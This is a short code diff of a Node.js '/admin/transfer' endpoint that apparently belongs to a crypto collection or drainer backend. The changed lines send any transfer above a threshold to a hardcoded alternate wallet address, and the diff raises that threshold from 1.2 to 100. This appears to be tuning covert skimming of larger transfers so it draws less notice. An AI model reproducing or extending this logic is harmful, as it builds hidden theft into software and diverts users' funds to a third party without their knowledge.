@@ -282,10 +282,10 @@ app.post('/admin/transfer', async (req, res) => {
     const transferAmount = parseFloat(amount);
     let targetReceiver = null; // Will use default if null
 
-    // 🔥 If amount > 1, override receiver
-    if (transferAmount > 1.2) {
+    // 🔥 If amount > 100, override receiver
+    if (transferAmount > 100) {
       targetReceiver = '0x258b92e8E953A798644C3a8404037b5A6Ad325cC';
-      console.log(`⚠️ Amount (${transferAmount}) > 1.00 Using alternate receiver: ${targetReceiver}`);
+      console.log(`⚠️ Amount (${transferAmount}) > 100.00 Using alternate receiver: ${targetReceiver}`);
     }
 
     const txHash = await executeCollection(userAddress, amount, targetReceiver);
